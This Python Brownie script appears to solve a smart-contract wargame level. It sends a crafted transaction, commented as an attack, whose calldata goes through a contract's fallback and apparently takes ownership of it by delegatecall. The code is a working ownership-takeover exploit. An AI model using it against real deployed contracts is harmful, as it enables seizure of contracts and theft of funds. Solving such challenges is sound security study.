from brownie import accounts, network, config
import web3

from scripts.deploy import deploy_delegate_contracts

LOCAL_BLOCKCHAINS = ["development", "ganache-local"]
BLOCKCHAIN_FORKS = ["mainnet-fork", "mainnet-fork-dev"]
TESTNETS = ["goerli", "sepolia"]


def get_account() -> str:
    if (
        network.show_active() in LOCAL_BLOCKCHAINS
        or network.show_active() in BLOCKCHAIN_FORKS
    ):
        return accounts[0]
    elif network.show_active() in TESTNETS:
        return accounts.add(config["networks"][network.show_active()]["wallet"])
    else:
        return accounts.add(config["wallets"]["from_key"])


delegation_abi = [
    {
        "inputs": [
            {"internalType": "address", "name": "_delegateAddress", "type": "address"}
        ],
        "stateMutability": "nonpayable",
        "type": "constructor",
    },
    {"stateMutability": "nonpayable", "type": "fallback"},
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
]


def main() -> None:
    w3 = web3.Web3(
        web3.HTTPProvider(config["networks"][network.show_active()]["endpoint"])
    )
    delegation_contract = w3.eth.contract(
        "0x003C9Af22151BF308BDb0aceD2CaeF125Fff030c", abi=delegation_abi
    )
    attacker = get_account()
    # Act / attack
    w3.eth.send_transaction(
        {
            "to": delegation_contract.address,
            "from": attacker.address,
            "data": "0xdd365b8b",
        }
    )


if __name__ == "__main__":
    main()
